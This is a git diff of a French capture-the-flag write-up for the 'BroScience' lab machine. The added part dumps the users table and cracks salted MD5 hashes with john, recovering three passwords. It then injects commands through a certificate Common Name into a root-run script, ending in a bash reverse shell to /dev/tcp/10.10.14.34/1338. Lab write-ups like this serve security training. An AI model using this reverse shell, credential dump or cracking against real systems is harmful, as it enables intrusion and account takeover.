@@ -323,6 +323,10 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
 
 # Elevation de privilèges
+
+###################################################################
+# ANCIENNE RESOLUTION ERRONNEE
+###################
 Après avoir téléchargé le script `lse.sh` puis l'avoir exécuté avec la commande : `bash ./lse.sh -l1 p1`, on découvre que le shell `bash` est setuid root :
 ```
 [!] fst020 Uncommon setuid binaries........................................ yes!                                      
@@ -341,3 +345,88 @@ cat /root/root.txt
 cat /home/bill/user.txt                                                                                               
 0d8eadfb********617b5debcecbfe54                      
 ```
+
+
+#####################################
+# NOUVELLE RESOLUTION PRIVESC
+#####################################
+
+On cherche dans la base de donnée si elle ne contient pas des informations intéressantes.
+
+Les identifiants de connexions étaient stockés dans le fichier `include/db_connect.php`.
+
+On utilise donc la commande suivante :
+
+```
+psql -h localhost -U dbuser -d broscience 
+```
+
+On liste les tables disponibles avec
+```
+\dt
+```
+
+Puis on liste les enregistrements de la table `users` :
+
+```
+select * from users;
+ id |   username    |             password             |            email             |         activation_code          | is_activated | is_admin |         date_created          
+----+---------------+----------------------------------+------------------------------+----------------------------------+--------------+----------+-------------------------------
+  1 | administrator | 15657792073e8a843d4f91fc403454e1 | administrator@broscience.htb | OjYUyL9R4NpM9LOFP0T4Q4NUQ9PNpLHf | t            | t        | 2019-03-07 02:02:22.226763-05
+  2 | bill          | 13edad4932da9dbb57d9cd15b66ed104 | bill@broscience.htb          | WLHPyj7NDRx10BYHRJPPgnRAYlMPTkp4 | t            | f        | 2019-05-07 03:34:44.127644-04
+  3 | michael       | bd3dad50e2d578ecba87d5fa15ca5f85 | michael@broscience.htb       | zgXkcmKip9J5MwJjt8SZt5datKVri9n3 | t            | f        | 2020-10-01 04:12:34.732872-04
+  4 | john          | a7eed23a7be6fe0d765197b1027453fe | john@broscience.htb          | oGKsaSbjocXb3jwmnx5CmQLEjwZwESt6 | t            | f        | 2021-09-21 11:45:53.118482-04
+  5 | dmytro        | 5d15340bded5b9395d5d14b9c21bc82b | dmytro@broscience.htb        | 43p9iHX6cWjr9YhaUNtWxEBNtpneNMYm | t            | f        | 2021-08-13 10:34:36.226763-04
+  6 | aze1          | 5cd6546fa55766a2210b9bb796127a2e | aze1@aze.fr                  | GqrsXMa5DfoEPGmy7MvyjZSF5yJmCUIU | t            | f        | 2023-04-06 15:49:55.735886-04
+```
+
+On enregistre ce contenu dans le fichier `raw`
+
+La génération du mot de passe est détaillée dans les fichiers suivants :
+- db_connect.php : on y trouve la valeur du salt : `$db_salt = "NaCl"`.
+- register.php : on y trouve que le mot de passe stocké en base est un hash MD5 de la concaténation du Salt et du mot de passe.
+
+On formatte donc le fichier raw pour qu'il soit interprettable par john :
+
+```
+$ awk -F '|' '{print $2":"$3"$NaCl"}' raw | sed 's/ //g' | tee hashes
+administrator:15657792073e8a843d4f91fc403454e1$NaCl
+bill:13edad4932da9dbb57d9cd15b66ed104$NaCl
+michael:bd3dad50e2d578ecba87d5fa15ca5f85$NaCl
+john:a7eed23a7be6fe0d765197b1027453fe$NaCl
+dmytro:5d15340bded5b9395d5d14b9c21bc82b$NaCl
+aze1:5cd6546fa55766a2210b9bb796127a2e$NaCl
+```
+
+On crack enfin nos hashes en précisant le format de génération des hashes :
+```
+$ john --wordlist=/usr/share/wordlists/rockyou.txt --format=dynamic='md5($s.$p)' hashes 
+Using default input encoding: UTF-8
+Loaded 6 password hashes with no different salts (dynamic=md5($s.$p) [256/256 AVX2 8x3])
+Warning: no OpenMP support for this hash type, consider --fork=4
+Press 'q' or Ctrl-C to abort, almost any other key for status
+iluvhorsesandgym (bill)     
+Aaronthehottest  (dmytro)     
+2applesplus2apples (michael)     
+```
+
+On se connecte ensuite en tant que "bill" via SSH et on récupère le Flag utilisateur.
+
+
+Privesc
+
+On découvre le script `/opt/renew_cert.sh` qui est vulnérable à une injection de commande bash.
+A première vue, ce script n'est pas exécuté dans cron ou tout du moins, pas depuis un emplacement sur lequel nous avons des droits de lecture.
+
+On vérifie s'il est appelé autrement via l'outil `pspy`.
+
+Au bout d'une minute, on découvre qu'il est effectivement appelé par l'utilisateur root avec en paramètre un certificat situé dans `/home/bill/Certs/broscience.crt`
+
+Après analyse du script vulnérable on détermine les éléments permettant de déclencher une exécution de code arbitraire :
+- il faut un certificat expirant dans moins de 24h
+- il faut que le `Common Name` contienne l'injection de commande.
+
+Après quelques test, facilités via le lancement du script à l'aide de `bash -x`, on on arrive à créer une payload fonctionnelle.
+
+
+`$(bash -c 'bash -i >& /dev/tcp/10.10.14.34/1338 0>&1'`
